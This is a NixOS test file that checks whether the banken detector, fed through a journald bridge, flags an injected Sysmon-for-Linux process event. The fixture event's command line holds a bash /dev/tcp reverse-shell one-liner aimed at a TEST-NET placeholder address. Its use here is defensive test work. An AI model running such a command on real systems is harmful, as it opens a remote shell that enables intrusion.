# End-to-end proof of the sysmon switch: a VM with services.banken.sysmon.enable = true on a
# journald-only host (the NixOS default: no /var/log/syslog). The switch brings up the
# banken-sysmon-journal bridge (journalctl -f -o cat -t sysmon, appended to a file) and runs banken
# as a continuous --watch daemon following that file as a `sysmon` source. Audit is OFF here on
# purpose, so the sysmon source is banken's ONLY source: an alert then proves the bytes travelled
# journal -> bridge -> banken and matched off the live stream.
#
# ============================================================================================
# BLOCKER -- this test does NOT run Microsoft's sysmonforlinux, and cannot:
#
#   * sysmonforlinux is an EULA-licensed Microsoft binary, not in nixpkgs, and running it needs
#     root + eBPF + the guest kernel's BTF. Packaging it is a separate, owner-level decision (the
#     MS EULA), out of this worker's scope and explicitly NOT done here.
#
# So the one link this test cannot exercise is "real Sysmon emits this XML to the journal". Every
# OTHER link -- the module wiring, the journalctl bridge, the append file, banken's tail+parse, the
# reverse_shell match -- is exercised by INJECTING a real-shaped Sysmon-for-Linux ProcessCreate
# record into the journal under identifier "sysmon" (systemd-cat), exactly the bytes sysmonforlinux
# would write. That is a genuine test of banken's half of the integration, NOT a faked pass of the
# live-Sysmon path: the injection is explicit and labelled, and the comment above the assertions
# says what remains unproven. When/if the MS binary is packaged, replace the injection block with a
# real Sysmon install + a benign reverse-shell exec and the rest of the script stands.
#
# This file is also NOT yet wired into flake.nix `checks` (flake.nix is owned elsewhere); the owner
# adds it there, as a plain nixosTest needing only ../module.nix (no mimi module), when they choose.
# ============================================================================================
#
# Driven the same way as the other switch tests (a small flake supplies banken's package); needs KVM.
{ pkgs, banken }:
pkgs.testers.runNixOSTest {
  name = "banken-sysmon-switch";

  nodes.machine = { ... }: {
    imports = [ ../module.nix ];
    services.banken = {
      enable = true;
      package = banken;
      alerts.jsonl = { enable = true; format = "ocsf"; };
      # THE switch: journald-only reading (fromJournal defaults true), so the bridge comes up and
      # banken becomes a --watch daemon following the sysmon source.
      sysmon.enable = true;
      audit.enable = false; # sysmon (via the bridge) is then banken's only source.
    };
    environment.systemPackages = [ pkgs.systemd ];
  };

  testScript = ''
    import json, time

    # The switch brought up the journal bridge and banken as the continuous daemon.
    machine.wait_for_unit("banken-sysmon-journal.service")
    machine.wait_for_unit("banken.service")
    machine.succeed("systemctl show -p ExecStart banken.service | grep -- --watch")
    machine.fail("systemctl is-active --quiet banken.timer")

    # A real-shaped Sysmon-for-Linux ProcessCreate (EventID 1), the Windows Sysmon <Event> XML with a
    # classic bash /dev/tcp reverse shell. 192.0.2.1 is TEST-NET-1 (RFC5737), routes nowhere. A unique
    # port ties the alert back to this record. The < > arrive XML-escaped, as Sysmon encodes them.
    # NOTE (see BLOCKER above): sysmonforlinux would write this to the journal itself; here we inject
    # the identical bytes under identifier "sysmon" because the MS binary cannot be packaged.
    port = "47123"
    record = (
        '<Event><System>'
        '<Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>'
        '<EventID>1</EventID><Version>5</Version><Level>4</Level>'
        '<TimeCreated SystemTime="2026-11-01T14:33:22.279000000Z"/>'
        '<Channel>Linux-Sysmon/Operational</Channel><Computer>rhel9</Computer>'
        '</System><EventData>'
        '<Data Name="RuleName">-</Data>'
        '<Data Name="UtcTime">2026-11-01 14:33:22.279</Data>'
        '<Data Name="ProcessId">414626</Data>'
        '<Data Name="Image">/usr/bin/bash</Data>'
        f'<Data Name="CommandLine">bash -i -c exec 3&lt;&gt;/dev/tcp/192.0.2.1/{port}</Data>'
        '<Data Name="CurrentDirectory">/root</Data>'
        '<Data Name="User">root</Data>'
        '<Data Name="ParentProcessId">414609</Data>'
        '<Data Name="ParentImage">/usr/bin/sshd</Data>'
        '<Data Name="ParentCommandLine">sshd: root@pts/0</Data>'
        '</EventData></Event>'
    )

    def alerts():
        out = machine.succeed("cat /var/log/banken/alerts-*.jsonl 2>/dev/null || true")
        return [json.loads(l) for l in out.splitlines() if l.strip()]

    before = len(alerts())
    t0 = time.monotonic()
    # systemd-cat tags the entry with SYSLOG_IDENTIFIER=sysmon; the bridge's `journalctl -t sysmon`
    # picks it up and `-o cat` writes just this MESSAGE (the XML) to the bridge file banken tails.
    machine.succeed("printf '%s' " + repr(record) + " | systemd-cat -t sysmon")

    hit = None
    for _ in range(400):  # up to ~20s
        for a in alerts()[before:]:
            if port in json.dumps(a):
                hit = a
                break
        if hit:
            break
        time.sleep(0.05)
    latency_ms = (time.monotonic() - t0) * 1000
    assert hit, f"no alert referencing port {port} within 20s (journal -> bridge -> banken path broke)"

    # It is a reverse_shell Detection Finding, OCSF 1.3.0; with audit off it can only have come off
    # the sysmon source (the bridged journal entry).
    assert hit["class_uid"] == 2004 and hit["metadata"]["version"] == "1.3.0", hit
    name = hit["finding_info"]["analytic"]["name"]
    assert name == "reverse_shell", f"fired {name!r}, expected reverse_shell"

    # The bridge really wrote the record to its append file -- the provenance of the alert.
    machine.succeed(f"grep -q {port} /var/log/banken-sysmon/sysmon.log")

    # What is proven: module wiring + journal bridge + banken tail/parse/match.
    # What is NOT proven here (the BLOCKER): that Microsoft sysmonforlinux itself emits this record.
    print(f"SYSMON WIRING PROOF PASS (injected record): services.banken.sysmon.enable -> "
          f"reverse_shell detected off the journal-bridged sysmon source; inject->alert {latency_ms:.0f} ms. "
          f"LIVE sysmonforlinux link is BLOCKED on packaging the MS EULA binary.")
  '';
}
